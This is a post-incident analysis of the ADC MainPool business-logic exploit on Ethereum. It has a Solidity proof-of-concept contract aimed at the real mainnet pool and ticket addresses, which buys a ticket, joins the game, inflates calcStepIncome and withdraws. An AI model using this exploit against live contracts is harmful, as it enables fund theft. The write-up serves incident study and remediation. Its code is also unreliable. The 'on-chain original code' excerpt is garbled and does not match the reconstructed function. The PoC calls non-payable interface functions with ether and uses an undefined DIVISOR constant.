# ADC (MainPool) — calcStepIncome Business Logic Flaw Analysis

| Field | Details |
|------|------|
| **Date** | 2024-02-06 |
| **Protocol** | ADC (MainPool) |
| **Chain** | Ethereum |
| **Loss** | ~20 ETH |
| **Attacker** | [0x24a0c66f](https://etherscan.io/address/0x24a0c66f185874b251eb70bee2c2e35e39848419) |
| **Attack Contract** | [0x2ffdce5f](https://etherscan.io/address/0x2ffdce5f0c09a8ee3a568bc01f35894b2d77a6d6) |
| **Vulnerable Contract** | [MainPool 0xdE46fcF6](https://etherscan.io/address/0xdE46fcF6aB7559E4355b8eE3D7fBa0f2730CDdd8) |
| **Root Cause** | `calcStepIncome()` accepts arbitrarily large parameter values without validation, allowing abnormal withdrawal amount calculation |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-02/ADC_exp.sol) |

---

## 1. Vulnerability Overview

The ADC protocol's MainPool contract calculates step-based income via `calcStepIncome()` after `joinGame()`, then allows withdrawal via `withdraw()`. The `calcStepIncome()` function has no upper-bound validation on its parameter value, allowing an attacker to pass an extremely large value to inflate the withdrawable amount abnormally.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: no upper-bound validation on parameter
function calcStepIncome(uint256 stepValue) external returns (uint256) {
    // No upper bound on stepValue — arbitrarily large value can be injected
    uint256 income = userDeposit[msg.sender] * stepValue / DIVISOR;
    pendingIncome[msg.sender] += income;
    return income;
}

// ✅ Safe code: parameter range validation + maximum withdrawal cap
uint256 constant MAX_STEP_VALUE = 1000; // 10x maximum

function calcStepIncome(uint256 stepValue) external returns (uint256) {
    require(stepValue <= MAX_STEP_VALUE, "step value too large");
    uint256 income = userDeposit[msg.sender] * stepValue / DIVISOR;
    require(pendingIncome[msg.sender] + income <= userDeposit[msg.sender] * 3, "exceeds max");
    pendingIncome[msg.sender] += income;
    return income;
}
```

### On-Chain Original Code

Source: Sourcify verified

```solidity
// File: MainPool.sol
contract gameDataSet {
    }
    
    struct Player{
        //uint256 pID;
        uint256 ticketInCost;     // how many eth can join
        uint256   withdrawAmount;     // how many eth can join  // ❌ vulnerability
        uint256 startTime;      // join the game time
        uint256 totalSettled;   // rturn  funds
        uint256 staticIncome;
        uint256 lastCalcSITime;      // last Calc staticIncome Time  
        //uint256 lastCalcDITime; //  last Calc dynamicIncome Time
        uint256 dynamicIncome; //  last Calc dynamicIncome
        uint256 stepIncome;
        bool isActive; // 1 mean is 10eth,2 have new one son,3,
        bool isAlreadGetIns;// already get insePoolBalance income;
    }
    
    
    struct Round{
        uint256 rID;            //Round ID
        uint256 rStartTime;      //Round start ID
        uint256 rPlys;           // new round players
        uint256 lastPID;         // last Player ID pID
        uint256 totalInseAmount; // 
        uint256 fritInsePoint;
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] Send 18 ETH to Helper contract
  │
  ├─→ [2] Ticket.buyADC(3 ETH) → Purchase ADC ticket
  │
  ├─→ [3] MainPool.joinGame(15 ETH) → Join game
  │
  ├─→ [4] MainPool.calcStepIncome(very large value)
  │         └─ Withdrawable amount inflated abnormally
  │
  ├─→ [5] MainPool.withdraw() → Withdraw inflated amount
  │
  └─→ [6] ~20 ETH profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
interface IMainPool {
    function joinGame(uint256 amount) external;
    function calcStepIncome(uint256 stepValue) external returns (uint256);
    function withdraw() external;
}

interface ITicket {
    function buyADC(uint256 amount) external payable;
}

contract HelperContract {
    IMainPool constant mainpool = IMainPool(0xdE46fcF6aB7559E4355b8eE3D7fBa0f2730CDdd8);
    ITicket   constant ticket   = ITicket(0xaE2C7af5fc2dDF45e6250a4C5495e61afC7AcF50);

    function startwith() external payable {
        // [1] Purchase ADC ticket (3 ETH)
        ticket.buyADC{value: 3 ether}(3 ether);

        // [2] Join game (15 ETH)
        mainpool.joinGame{value: 15 ether}(15 ether);

        // [3] Calculate income with inflated step value
        mainpool.calcStepIncome(type(uint256).max / DIVISOR);

        // [4] Withdraw inflated amount
        mainpool.withdraw();
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Business Logic Flaw |
| **CWE** | CWE-20: Improper Input Validation |
| **Attack Vector** | External (parameter manipulation) |
| **DApp Category** | GameFi / Yield Distribution Protocol |
| **Impact** | Protocol fund theft |

## 6. Remediation Recommendations

1. **Parameter upper-bound validation**: Set a reasonable maximum value for `stepValue` and enforce it with a `require` check
2. **Maximum withdrawal cap**: Enforce an upper limit so total withdrawable amount cannot exceed a multiple of the deposited amount
3. **Withdrawal cooldown**: Allow `withdraw` only after a minimum of n blocks following `joinGame`
4. **Withdrawal amount logging**: Emit events for abnormal withdrawal attempts and monitor them

## 7. Lessons Learned

- Input parameters of income calculation functions must always be validated against an acceptable range.
- GameFi protocols often contain complex income calculation logic, making them especially susceptible to business logic vulnerabilities.
- Upper-bound parameter validation is one of the most fundamental yet frequently overlooked security controls.